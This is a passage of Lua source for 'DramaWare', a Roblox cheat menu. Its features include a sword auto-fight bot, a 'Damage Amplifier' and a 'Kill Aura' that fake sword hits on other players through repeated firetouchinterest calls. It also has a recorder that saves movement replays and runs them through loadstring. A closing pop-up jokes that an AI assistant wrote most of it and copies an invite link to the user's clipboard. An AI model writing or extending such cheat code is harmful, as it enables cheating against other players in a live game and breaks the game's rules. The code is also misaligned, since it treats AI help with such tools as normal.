                    _bg3.P = 10000
                    _bg3.D = 1
                    _bg3.Parent = game.ReplicatedStorage
                    
                    local _conn3
                    _conn3 = game:GetService("RunService").RenderStepped:Connect(function()
                        if not _sfBot_Camp_enabled then
                            _bg3.Parent = game.ReplicatedStorage
                            _human.AutoRotate = true
                            _conn3:Disconnect()
                            return
                        end
                        
                        local _hasSword3 = false
                        local _chr3chk = _player.Character
                        if _chr3chk then
                            for _, item in pairs(_chr3chk:GetChildren()) do
                                if item:IsA("Tool") and item.Name:lower():find("sword") then _hasSword3 = true; break end
                            end
                        end
                        if not _hasSword3 then
                            local _bp3chk = _player:FindFirstChild("Backpack")
                            if _bp3chk then
                                for _, item in pairs(_bp3chk:GetChildren()) do
                                    if item:IsA("Tool") and item.Name:lower():find("sword") then _hasSword3 = true; break end
                                end
                            end
                        end
                        if not _hasSword3 then
                            _sfBot_Camp_enabled = false
                            _bg3.Parent = game.ReplicatedStorage
                            _human.AutoRotate = true
                            _conn3:Disconnect()
                            return
                        end
                        
                        _stupid = _player.Character or _stupid
                        _human = _stupid:FindFirstChildOfClass("Humanoid") or _human
                        _root = _stupid:FindFirstChild("HumanoidRootPart") or _root
                        local t3 = _cachedTarget
                        if not t3 then _bg3.Parent = game.ReplicatedStorage; _human.AutoRotate = true; return end
                        local h3 = t3:FindFirstChildOfClass("Humanoid")
                        local r3 = t3:FindFirstChild("HumanoidRootPart")
                        if not h3 or not r3 or h3.Health <= 0 then _bg3.Parent = game.ReplicatedStorage; _human.AutoRotate = true; return end
                        _bg3.Parent = _root
                        _human.AutoRotate = false
                        local tool3 = _stupid:FindFirstChildOfClass("Tool")
                        if not tool3 then
                            local bp3 = _player:FindFirstChild("Backpack")
                            if bp3 then for _, item in pairs(bp3:GetChildren()) do if item:IsA("Tool") then _human:EquipTool(item) break end end end
                        end
                        tool3 = _stupid:FindFirstChildOfClass("Tool")
                        local rarm3 = t3:FindFirstChild("Right Arm") or t3:FindFirstChild("Right Hand")
                        if tool3 and tool3:FindFirstChild("Handle") then
                            local handle3 = tool3.Handle
                            local tip3 = (handle3.CFrame * CFrame.new(0, 0, -4)).Position
                            local bestPos3, bestDist3 = nil, math.huge
                            if rarm3 then
                                for _, offset in ipairs({Vector3.new(0,0,0), Vector3.new(0.5,0,0), Vector3.new(-0.5,0,0)}) do
                                    local castDir3 = ((rarm3.Position + offset) - tip3).Unit * 100
                                    local result3 = workspace:Raycast(tip3, castDir3, RaycastParams.new())
                                    if result3 then
                                        local dist3 = (result3.Position - tip3).Magnitude
                                        if dist3 < bestDist3 then bestDist3 = dist3; bestPos3 = result3.Position end
                                    end
                                end
                            end
                            if bestPos3 then
                                local dir3 = (bestPos3 - tip3).Unit * Vector3.new(1, 0, 1)
                                _bg3.CFrame = CFrame.new(_root.Position, _root.Position + dir3)
                            else
                                local fb3 = rarm3 and (rarm3.Position - tip3).Unit * Vector3.new(1, 0, 1) or (r3.Position - _root.Position).Unit * Vector3.new(1, 0, 1)
                                _bg3.CFrame = CFrame.new(_root.Position, _root.Position + fb3)
                            end
                        else
                            local drtn3 = ((r3.CFrame * CFrame.new(3, 0, 0).p) - _root.Position) * Vector3.new(1, 0, 1)
                            _bg3.CFrame = CFrame.new(_root.Position, _root.Position + drtn3)
                        end
                        
                        local ms3 = tick()
                        local dist3 = (r3.Position - _root.Position).Magnitude
                        if dist3 > 19 then
                            _human:MoveTo(r3.Position)
                        else
                            if r3.CFrame.LookVector.Unit:Dot((_root.Position - r3.Position).Unit) > 0.75 and dist3 < 15 then
                                _bg3.CFrame = CFrame.new(_root.Position, _root.Position + ((r3.CFrame * CFrame.new(4, 0, 0).Position) - _root.Position).Unit * Vector3.new(1, 0, 1)) * CFrame.Angles(0, math.rad(math.sin(tick() * 35) * 25 * ((_number3 - (math.random() * 5)) / 35)), 0)
                            end
                            if ms3 - _lastMove3 > math.random() * ((_number3 ^ 2 / 10) / (380 + math.random())) then
                                _lastMove3 = tick()
                                local sa3 = 1 * (_number3 * math.random() * 2 + (math.random() * 5) / 25)
                                local off3 = Vector3.new(math.random(-sa3, sa3), 0, math.random(-sa3, sa3))
                                _human:MoveTo((r3.Position - (r3.Position - _root.Position).Unit * 2.5) + off3)
                                if sa3 < 1 then _human.Jump = true end
                                if r3.Position.Y - 0.5 > _root.Position.Y then _human.Jump = true end
                            end
                        end
                        
                        if tool3 and ms3 - _lastActivate3 > math.random(1, 3) / 10 then
                            _lastActivate3 = ms3
                            tool3:Activate()
                            local rem3 = tool3:FindFirstChildOfClass("RemoteEvent")
                            if rem3 then rem3:FireServer() end
                        end
                    end)
                end)
            end
        end
    })

    local _dmgAmp_Camp_enabled = false
    local _dmgAmp_Camp_amount = 7
    local _dmgAmp_Camp_conn
    AutoplayTab:CreateToggle({
        Name = "Damage Amplifier",
        CurrentValue = false,
        Flag = "SwordDamageAmpCamp",
        Callback = function(Value)
            _dmgAmp_Camp_enabled = Value
            if Value then
                _dmgAmp_Camp_conn = game:GetService("RunService").RenderStepped:Connect(function()
                    local _p3 = game.Players.LocalPlayer
                    local _char3 = _p3.Character
                    local _tool3 = _char3 and _char3:FindFirstChildOfClass("Tool")
                    if _tool3 and _tool3:FindFirstChild("Handle") then
                        local _handle3 = _tool3.Handle
                        local _myroot3 = _char3:FindFirstChild("HumanoidRootPart")
                        for _, _enemy3 in pairs(game.Players:GetPlayers()) do
                            if _enemy3 ~= _p3 and _enemy3.Character then
                                local _ehmd3 = _enemy3.Character:FindFirstChild("Humanoid")
                                local _eroot3 = _enemy3.Character:FindFirstChild("HumanoidRootPart")
                                if _ehmd3 and _eroot3 and _myroot3 and _ehmd3.Health > 0 then
                                    local _dist3 = (_myroot3.Position - _eroot3.Position).Magnitude
                                    if _dist3 <= math.random(5, 12) then
                                        for _i3 = 1, _dmgAmp_Camp_amount do
                                            firetouchinterest(_eroot3, _handle3, 0)
                                            firetouchinterest(_eroot3, _handle3, 1)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if _dmgAmp_Camp_conn then _dmgAmp_Camp_conn:Disconnect() _dmgAmp_Camp_conn = nil end
            end
        end
    })
    
    AutoplayTab:CreateSlider({
        Name = "Damage Amplifier Hits",
        Range = {1, 20},
        Increment = 1,
        Suffix = "x",
        CurrentValue = 7,
        Flag = "SwordDamageAmpCampAmount",
        Callback = function(Value)
            _dmgAmp_Camp_amount = Value
        end
    })

    local _killAura_Camp_enabled = false
    local _killAura_Camp_range = 15
    local _killAura_Camp_conn = nil
    AutoplayTab:CreateToggle({
        Name = "Kill Aura",
        CurrentValue = false,
        Flag = "SwordKillAuraCamp",
        Callback = function(Value)
            _killAura_Camp_enabled = Value
            if Value then
                _killAura_Camp_conn = game:GetService("RunService").RenderStepped:Connect(function()
                    local _p = game.Players.LocalPlayer
                    local ps = game.Players:GetPlayers()
                    for i = 2, #ps do
                        local v = ps[i].Character
                        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and _p:DistanceFromCharacter(v.HumanoidRootPart.Position) <= _killAura_Camp_range then
                            local tool = _p.Character and _p.Character:FindFirstChildOfClass("Tool")
                            if tool and tool:FindFirstChild("Handle") then
                                for _ = 1, 10 do
                                    tool:Activate()
                                    for _, part in next, v:GetChildren() do
                                        if part:IsA("BasePart") then
                                            firetouchinterest(tool.Handle, part, 0)
                                            firetouchinterest(tool.Handle, part, 1)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            else
                if _killAura_Camp_conn then _killAura_Camp_conn:Disconnect() _killAura_Camp_conn = nil end
            end
        end
    })
    
    AutoplayTab:CreateSlider({
        Name = "Kill Aura Range",
        Range = {1, 500},
        Increment = 1,
        Suffix = " studs",
        CurrentValue = 15,
        Flag = "SwordKillAuraCampRange",
        Callback = function(Value)
            _killAura_Camp_range = Value
        end
    })
end

AutoplayTab:CreateSection("Movement Recorder")

_rec_statusElem = AutoplayTab:CreateLabel("Status: Idle", "activity")

local _rec_autoRoundRecord = false
AutoplayTab:CreateToggle({
    Name = "Record on Round Start / Stop on Round End",
    CurrentValue = false,
    Callback = function(Value)
        _rec_autoRoundRecord = Value
        if not Value then
            if _rec_isRec then
                _rec_isRec = false
                if _rec_recConn then _rec_recConn:Disconnect(); _rec_recConn = nil end
                if _rec_statusElem then
                    _rec_statusElem:Set("⏹ Stopped " .. #_rec_recording .. " frames")
                end
            end
            return
        end
        task.spawn(function()
            while _rec_autoRoundRecord do
                if TAS_IsInChallenge() then
                    local Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if Hum and Hum.WalkSpeed == 0 then
                        while _rec_autoRoundRecord and TAS_IsInChallenge() do
                            Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                            if Hum and Hum.WalkSpeed >= 16 then break end
                            task.wait(0.05)
                        end
                        if not _rec_autoRoundRecord or not TAS_IsInChallenge() then
                            task.wait(0.5)
                        else
                            local Players   = game:GetService("Players")
                            local RunService = game:GetService("RunService")
                            local player    = Players.LocalPlayer
                            local char      = player.Character or player.CharacterAdded:Wait()
                            local root      = char and char:FindFirstChild("HumanoidRootPart")
                            local hum       = char and char:FindFirstChildOfClass("Humanoid")
                            if root and hum then
                                if _rec_recConn then _rec_recConn:Disconnect(); _rec_recConn = nil end
                                _rec_recording       = {}
                                _rec_isRec           = true
                                _rec_recordStartTime = tick()
                                _rec_pauseOffset     = 0
                                if _rec_statusElem then _rec_statusElem:Set("🔴 Auto Recording...") end
                                _rec_recConn = RunService.RenderStepped:Connect(function()
                                    if not _rec_isRec then return end
                                    local p2   = Players.LocalPlayer
                                    local c2   = p2.Character
                                    if not c2 then return end
                                    local r2   = c2:FindFirstChild("HumanoidRootPart")
                                    local h2   = c2:FindFirstChildOfClass("Humanoid")
                                    local cam2 = workspace.CurrentCamera
                                    if r2 and h2 then
                                        table.insert(_rec_recording, {
                                            cf    = r2.CFrame,
                                            vel   = r2.Velocity,
                                            state = h2:GetState(),
                                            camCf = cam2.CFrame,
                                            t     = (tick() - _rec_recordStartTime) - _rec_pauseOffset,
                                        })
                                    end
                                end)
                            end
                            
                            local _rec_finishConn = nil
                            local function connectFinishParts()
                                for _, obj in ipairs(workspace:GetDescendants()) do
                                    if obj:IsA("BasePart") and obj.Name == "Finish" then
                                        local c = obj.Touched:Connect(function(hit)
                                            local hitChar = hit and hit.Parent
                                            local hitPlayer = game:GetService("Players"):GetPlayerFromCharacter(hitChar)
                                            if hitPlayer == Players.LocalPlayer and _rec_isRec then
                                                _rec_isRec = false
                                                if _rec_recConn then _rec_recConn:Disconnect(); _rec_recConn = nil end
                                                if _rec_finishConn then
                                                    for _, fc in ipairs(_rec_finishConn) do fc:Disconnect() end
                                                    _rec_finishConn = nil
                                                end
                                                if _rec_statusElem then
                                                    _rec_statusElem:Set("⏹ Stopped " .. #_rec_recording .. " frames")
                                                end
                                            end
                                        end)
                                        table.insert(_rec_finishConn, c)
                                    end
                                end
                            end
                            _rec_finishConn = {}
                            connectFinishParts()
                            
                            while _rec_autoRoundRecord and _rec_isRec do
                                task.wait(0.2)
                            end
                            
                            if _rec_finishConn then
                                for _, fc in ipairs(_rec_finishConn) do fc:Disconnect() end
                                _rec_finishConn = nil
                            end
                            
                            while _rec_autoRoundRecord and TAS_IsInChallenge() do
                                task.wait(0.5)
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end,
})

AutoplayTab:CreateInput({
    Name               = "Save Recording",
    PlaceholderText    = "Type name & press Enter to save...",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        _rec_fileName = (text and text ~= "") and text:gsub("%s+", "_") or nil
        pcall(function()
            if #_rec_recording == 0 then
                if _rec_statusElem then _rec_statusElem:Set(" Nothing recorded yet!") end
                return
            end
            if not isfolder("DramaWare")             then makefolder("DramaWare")             end
            if not isfolder("DramaWare/Recordings")  then makefolder("DramaWare/Recordings")  end
            
            local name     = (_rec_fileName and _rec_fileName ~= "") and _rec_fileName or ("Recording_" .. os.time())
            local filePath = "DramaWare/Recordings/" .. name .. ".lua"

            local c = "--Movement Recording (world coords)\n"
            c = c .. "local p=game.Players.LocalPlayer;"
            c = c .. "local r=p.Character.HumanoidRootPart;"
            c = c .. "local h=p.Character.Humanoid;"
            c = c .. "local cam=workspace.CurrentCamera;"
            c = c .. "local d={"
            for _, v in ipairs(_rec_recording) do
                c = c .. string.format("{CFrame.new(%s),Vector3.new(%s),Enum.HumanoidStateType.%s,CFrame.new(%s),%s},",
                    tostring(v.cf), tostring(v.vel), v.state.Name, tostring(v.camCf), tostring(v.t))
            end
            c = c .. "};"
            c = c .. "local ct=cam.CameraType;"
            c = c .. "cam.CameraType=Enum.CameraType.Scriptable;"
            c = c .. "local s=tick();"
            c = c .. "local run=game:GetService('RunService');"
            c = c .. "local conn;"
            c = c .. "conn=run.RenderStepped:Connect(function() "
                  .. "local e=tick()-s "
                  .. "if e>=d[#d][5] then conn:Disconnect() r.Velocity=Vector3.zero cam.CameraType=ct return end "
                  .. "local lo=1;local hi=#d;local idx=1 "
                  .. "while lo<=hi do local mid=math.floor((lo+hi)/2) "
                  .. "if d[mid][5]<=e then idx=mid;lo=mid+1 else hi=mid-1 end end "
                  .. "local a=d[idx];local b=d[idx+1] or a "
                  .. "local alp=0 if b~=a then alp=(e-a[5])/(b[5]-a[5]) end "
                  .. "r.CFrame=a[1]:Lerp(b[1],alp);"
                  .. "cam.CFrame=a[4]:Lerp(b[4],alp);"
                  .. "r.Velocity=a[2];"
                  .. "if h:GetState()~=a[3] then h:ChangeState(a[3]) end "
                  .. "end)"

            writefile(filePath, c)
            setclipboard(c)
            if _rec_statusElem then _rec_statusElem:Set("💾 Saved: " .. name) end
        end)
    end,
})

_rec_loadDropdown = AutoplayTab:CreateDropdown({
    Name          = "Load Recording",
    Options       = _rec_getFiles(),
    CurrentOption = _rec_getFiles()[1],
    Callback = function(Option)
        local selected = (type(Option) == "table") and (Option.Option or Option[1]) or Option
        _rec_selectedLoad = tostring(selected or "")
    end,
})

local _rec_autoRoundPlay = false
AutoplayTab:CreateToggle({
    Name = "Play Selected on Round Start",
    CurrentValue = false,
    Callback = function(Value)
        _rec_autoRoundPlay = Value
        if not Value then return end
        task.spawn(function()
            while _rec_autoRoundPlay do
                if TAS_IsInChallenge() then
                    local Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                    if Hum and Hum.WalkSpeed == 0 then
                        while _rec_autoRoundPlay and TAS_IsInChallenge() do
                            Hum = TAS_LocalPlayer.Character and TAS_LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                            if Hum and Hum.WalkSpeed >= 16 then break end
                            task.wait(0.05)
                        end
                        if not _rec_autoRoundPlay or not TAS_IsInChallenge() then
                            task.wait(0.5)
                        else
                            if _rec_selectedLoad and _rec_selectedLoad ~= "" and _rec_selectedLoad ~= "(no recordings)" and _rec_selectedLoad ~= "(nothing)" then
                                local filePath = "DramaWare/Recordings/" .. _rec_selectedLoad .. ".lua"
                                local ok, src = pcall(readfile, filePath)
                                if ok and src and src ~= "" then
                                    local fn, err = loadstring(src)
                                    if fn then
                                        if _rec_statusElem then _rec_statusElem:Set("▶ Auto: " .. _rec_selectedLoad) end
                                        task.spawn(fn)
                                    else
                                        if _rec_statusElem then _rec_statusElem:Set(" Error: " .. tostring(err)) end
                                    end
                                else
                                    if _rec_statusElem then _rec_statusElem:Set(" File not found!") end
                                end
                            end
                            while _rec_autoRoundPlay and TAS_IsInChallenge() do
                                task.wait(0.5)
                            end
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end,
})

AutoplayTab:CreateDivider()

Rayfield:Notify({
    Title = "As for owner consent, Claude wrote a majority of it soo",
    Content = "The better niko fanclub invite was copied to your clipboard.",
    Duration = 6,
})

-- RELEASED UNDER MIT LICENSE, DO WHATEVERRR